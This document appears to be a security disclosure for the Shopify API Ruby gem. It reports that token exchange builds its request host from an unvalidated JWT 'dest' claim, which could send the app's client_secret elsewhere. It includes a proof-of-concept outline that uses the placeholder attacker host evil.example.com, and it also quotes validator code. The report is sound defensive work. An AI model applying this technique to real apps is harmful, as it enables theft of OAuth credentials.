### Title
Token Exchange sends `client_secret` to an unvalidated host derived from the JWT `dest` claim — ([File: lib/shopify_api/auth/token_exchange.rb])

### Summary
`TokenExchange.exchange_token` derives the destination shop host directly from a session-token JWT's `dest` claim without passing it through `Utils::ShopValidator`, unlike every sibling credential-exchange method in the same file/module family, which allows the app's `client_secret` to be sent to a host string that is never checked to be a genuine, well-formed Shopify domain.

### Finding Description
`JwtPayload#shop` simply strips the `https://` prefix from the raw `dest` claim with no format or domain validation: `@dest.gsub("https://", "")` [3](#0-2) . The only integrity check performed on the token is that it is signed by `Context.api_secret_key` (or `old_api_secret_key`) and that `aud == Context.api_key` [4](#0-3) . There is no check binding `dest`/`iss` to a trusted `*.myshopify.com`/`myshopify.io`/etc. domain shape.

`TokenExchange.exchange_token` takes this unvalidated `dest_shop` and uses it directly as the `Session#shop`: `dest_shop = jwt_payload.shop` ... `shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)` [5](#0-4) . It then POSTs a body containing `client_id`, `client_secret`, and the subject token to `#{shop_session.shop}/admin/oauth/access_token` via `Clients::HttpClient`, which builds its base URI directly from `session.shop`: `@base_uri = "https://#{api_host || session.shop}"` [1](#0-0) , `client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")` [6](#0-5) .

Contrast this with every other credential-exchange entry point in this gem, which explicitly runs the shop through `Utils::ShopValidator.sanitize!` before constructing the session that becomes the request host:
- `ClientCredentials.client_credentials`: `validated_shop = Utils::ShopValidator.sanitize!(shop)` [7](#0-6) 
- `RefreshToken.refresh_access_token`: `validated_shop = Utils::ShopValidator.sanitize!(shop)` [8](#0-7) 
- `TokenExchange.migrate_to_expiring_token`: `validated_shop = Utils::ShopValidator.sanitize!(shop)` [9](#0-8) 

`Utils::ShopValidator.sanitize!` exists precisely to reject any domain that isn't one of the `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) or a configured `myshopify_domain` [10](#0-9) . `exchange_token` is the one path in this family that skips this check entirely — the binding that should hold is "the host that receives the `client_secret`" == "a validated Shopify-owned domain," and this equality is not enforced for the token-exchange flow.

### Impact Explanation
If an app relying on this gem trusts `TokenExchange.exchange_token`'s handling of the `dest` claim (per the gem's own documentation, which states "the shop always comes from the session token `dest` claim" and that the `shop` parameter is redundant/deprecated), any session token whose `dest` claim is not a well-formed `*.myshopify.com` (or otherwise trusted) domain results in the app's `client_id`/`client_secret` being POSTed to an arbitrary attacker-influenced host. This is a High-impact SSRF that carries the app's own OAuth credentials to a host outside Shopify's infrastructure.

### Likelihood Explanation
Exploitation requires a validly-signed session token (signed with `Context.api_secret_key`) whose `dest` claim is attacker-influenced but not itself validated as a trusted domain — this in turn depends on how the token is minted/relayed by upstream infrastructure. Within this gem's own code, the `JwtPayload` class performs no domain-format check on `dest`, and `exchange_token` is the single call site in this module family that omits `ShopValidator.sanitize!`, which is a direct, demonstrable inconsistency in this gem's own trust boundary rather than a hypothetical.

### Recommendation
In `lib/shopify_api/auth/token_exchange.rb`, validate `dest_shop` with `Utils::ShopValidator.sanitize!(dest_shop)` before constructing `shop_session`, mirroring `migrate_to_expiring_token`, `client_credentials`, and `refresh_access_token`. Additionally, `JwtPayload#shop`/`#initialize` in `lib/shopify_api/auth/jwt_payload.rb` should validate that `dest` (and `iss`) match a trusted Shopify domain shape as part of JWT verification, not leave it to individual callers.

### Proof of Concept
1. Obtain (or have relayed) a session token whose `iss`/`dest`/`aud` fields are HS256-signed with the app's real `api_secret_key` (e.g., via a misconfigured token relay, a compromised intermediary, or any code path that mints/forwards tokens using the app secret) but whose `dest` claim is set to an attacker-controlled host, e.g. `dest: "https://evil.example.com"`.
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)`.
3. `JwtPayload.new(token)` accepts the token because signature and `aud` check pass; `jwt_payload.shop` returns `"evil.example.com"` with no domain validation [3](#0-2) .
4. `HttpClient` builds `@base_uri = "https://evil.example.com"` [1](#0-0)  and POSTs `{client_id, client_secret, subject_token, ...}` to `https://evil.example.com/admin/oauth/access_token`, leaking the app's `client_secret` to the attacker-controlled host.

      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
